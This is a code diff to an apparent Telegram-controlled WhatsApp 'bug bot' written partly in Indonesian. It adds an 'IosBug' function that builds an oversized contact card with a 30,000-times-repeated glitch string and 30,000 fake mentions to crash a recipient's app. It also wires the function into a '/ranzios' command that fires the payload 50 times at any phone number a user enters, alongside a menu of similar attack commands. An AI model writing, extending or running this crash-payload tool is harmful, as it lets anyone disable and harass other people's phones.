@@ -362,6 +362,54 @@ async function feerwill(target, mention) {
         });
     }
 }
+async function IosBug(target) {
+  const glitchText = "𑇂𑆵𑆴𑆿".repeat(30000);
+  const name = `[X] Here 🧞‍♂️${glitchText}`;
+  const filler = "{Kipop.Cloud}";
+  const VCardAPI = `
+BEGIN:VCARD
+VERSION:3.0
+N:;${name};;;
+FN:${name}
+NICKNAME:${name}
+ORG:${name}
+TITLE:${name}
+item1.TEL;waid=666:666
+item1.X-ABLabel:Telepon
+item2.EMAIL;type=INTERNET:${filler}
+item2.X-ABLabel:Kantor
+item3.EMAIL;type=INTERNET:${filler}
+item3.X-ABLabel:Kantor
+item4.EMAIL;type=INTERNET:${filler}
+item4.X-ABLabel:Pribadi
+item5.ADR:;;${filler};;;;
+item5.X-ABADR:ac
+item5.X-ABLabel:Rumah
+X-YAHOO;type=KANTOR:${filler}
+PHOTO;BASE64:/9j/4AAQSkZJRgABAQAAAQABAAD/…(potong karena panjang)…
+X-WA-BIZ-NAME:${name}
+END:VCARD`;
+
+  const message = {
+    contactMessage: {
+      displayName: name,
+      vcard: VCardAPI,
+      contextInfo: {
+        mentionedJid: [
+          ...Array.from({ length: 30000 }, () =>
+            `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
+          )
+        ]
+      }
+    }
+  };
+
+  for (let i = 0; i < 2; i++) {
+    await sock.relayMessage(target, message, {
+      participant: { jid: target }
+    });
+  }
+}
 async function SLoct(target) {
   try {
    const MD = {
@@ -4124,8 +4172,8 @@ bot.onText(/\/bugmgvbbenu/, (msg) => {
 │
 │   ⚘ BUG MENU ⚘
 │ 
-│ ❀ /ranzunli <number>
-│ ❀ /ranznew <number> 
+│ ❀ /ranzunlixx <number>
+│ ❀ /ranznewx <number> 
 │ ❀ /ranznull <number>
 │ ❀ /ranzios <number>
 │ ❀ /ranzcombo <number>
@@ -4340,7 +4388,7 @@ bot.onText(/\/delaykont(?:\s(.+))?/, async (msg, match) => {
 ┗━━━━━━━━━━━━━━━━━━━━━━━━━━┛`
     });
 });
-bot.onText(/\/ranzunli(?:\s(.+))?/, async (msg, match) => {
+bot.onText(/\/ranzunlix(?:\s(.+))?/, async (msg, match) => {
     const senderId = msg.from.id;
     const chatId = msg.chat.id;
     
@@ -4387,7 +4435,7 @@ bot.onText(/\/ranzunli(?:\s(.+))?/, async (msg, match) => {
 ┏━━━━━━〣 𝗡𝗢𝗧𝗜𝗙𝗜𝗖𝗔𝗧𝗜𝗢𝗡 〣━━━━━━┓
 ┃         〢𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆 𝗦𝗲𝗻𝘁 𝗕𝘂𝗴 𝘁𝗼〢
 ┃〢 Tᴀʀɢᴇᴛ : ${numberTarget}
-┃〢 Cᴏᴍᴍᴀɴᴅ : /ranzunli
+┃〢 Cᴏᴍᴍᴀɴᴅ : /ranzunlix
 ┃〢 Wᴀʀɴɪɴɢ : ᴊᴇᴅᴀ 20 ᴍᴇɴɪᴛ ʏᴀ ᴋɪᴅs
 ┗━━━━━━━━━━━━━━━━━━━━━━━━━━┛`
     });
@@ -4426,8 +4474,10 @@ bot.onText(/\/ranzios(?:\s(.+))?/, async (msg, match) => {
 
     // Proses pengiriman bug
     for (let i = 0; i < 50; i++) { // Kirim 3 kali langsung
-        await iosinVisFC(formatedNumber, false)
+        await iosinVisFC(formatedNumber)
         await new Promise((resolve) => setTimeout(resolve, 2000));
+        await IosBug(formatedNumber)
+        await new Promise((resolve) => setTimeout(resolve, 1000));
         console.log(chalk.red("Send Bug Succes"))
     }
 
@@ -4491,7 +4541,7 @@ bot.onText(/\/ranznull(?:\s(.+))?/, async (msg, match) => {
 ┗━━━━━━━━━━━━━━━━━━━━━━━━━━┛`
     });
 });
-bot.onText(/\/ranznew(?:\s(.+))?/, async (msg, match) => {
+bot.onText(/\/ranznewx(?:\s(.+))?/, async (msg, match) => {
     const senderId = msg.from.id;
     const chatId = msg.chat.id;
     
@@ -4893,8 +4943,8 @@ bot.on("callback_query", async (callbackQuery) => {
 │
 │   ⚘ BUG MENU ⚘
 │ 
-│ ❀ /ranzunli <number>
-│ ❀ /ranznew <number> 
+│ ❀ /ranzunlix <number>
+│ ❀ /ranznewx <number> 
 │ ❀ /ranznull <number>
 │ ❀ /ranzios <number>
 │ ❀ /ranzcombo <number>
